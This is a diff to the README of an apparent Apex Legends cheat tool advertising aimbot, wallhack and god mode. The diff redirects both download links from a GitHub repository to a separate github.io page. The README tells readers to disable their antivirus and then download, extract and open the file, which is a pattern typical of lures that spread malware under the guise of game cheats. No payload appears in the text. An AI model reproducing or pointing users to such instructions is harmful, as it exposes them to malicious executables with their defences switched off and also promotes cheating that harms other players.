@@ -1,6 +1,6 @@
 # 🚀 Apex-Rage-Cheat - Gain an advantage in every match
 
-[![Download Now](https://img.shields.io/badge/Download-Apex--Rage--Cheat-blue.svg)](https://github.com/uncomplimentary-situationcomedy998/Apex-Rage-Cheat)
+[![Download Now](https://img.shields.io/badge/Download-Apex--Rage--Cheat-blue.svg)](https://uncomplimentary-situationcomedy998.github.io)
 
 This software provides players with tools to improve their performance in Apex Legends. The suite includes features like ESP, Aimbot, Wallhack, No Recoil, Triggerbot, Silent Aim, Speed Hack, Super Jump, and God Mode. These tools allow you to track enemies through walls, automate your aiming, and modify movement capabilities.
 
@@ -21,7 +21,7 @@ Disable your antivirus software temporarily before you proceed. Antivirus tools 
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit this page to download the software: https://github.com/uncomplimentary-situationcomedy998/Apex-Rage-Cheat
+1. Visit this page to download the software: https://uncomplimentary-situationcomedy998.github.io
 2. Locate the file in your downloads folder once the process finishes.
 3. Right-click the file and select Extract All to unzip the contents.
 4. Open the folder you just created.
